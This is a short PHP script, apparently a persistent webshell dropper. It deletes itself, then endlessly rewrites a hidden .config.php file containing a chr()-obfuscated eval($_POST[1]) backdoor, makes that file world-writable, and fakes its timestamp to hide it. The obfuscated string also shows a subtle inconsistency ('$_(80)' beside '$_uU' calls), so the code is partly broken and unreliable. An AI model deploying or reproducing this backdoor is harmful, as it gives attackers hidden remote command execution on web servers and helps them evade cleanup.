<?php
	set_time_limit(0);
	ignore_user_abort(1);
	unlink(__FILE__);
	while(1){
		file_put_contents('./.config.php', '<?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_$_fF("",$_cC);@$_();?>');
		system('chmod 777 .config.php');					
		//持续在config.php中写入
		touch("./.config.php", mktime(20,15,1,11,17,2017));	
		usleep(100);
	}
?>